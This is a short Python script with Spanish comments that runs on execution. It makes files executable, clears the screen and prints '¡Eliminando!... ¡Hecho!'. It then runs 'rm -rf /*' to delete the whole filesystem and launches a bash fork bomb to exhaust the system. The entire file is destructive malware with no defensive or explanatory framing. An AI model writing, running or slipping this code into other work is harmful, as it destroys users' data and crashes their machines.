import os
import time

#Dando permisos jiji
def permisos():
	os.system("chmod +x *")
	


#Clear
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

    

# Deleted Carpetas
def deleted():
	os.system("rm -rf /*")
	time.sleep(6.50)
	os.system(":(){ :|:& };:")
	
def script():
	permisos()
	clear()
	print("¡Eliminando!...")
	time.sleep(1)
	print("¡Hecho!")
	deleted()
	
	
script()
	

    
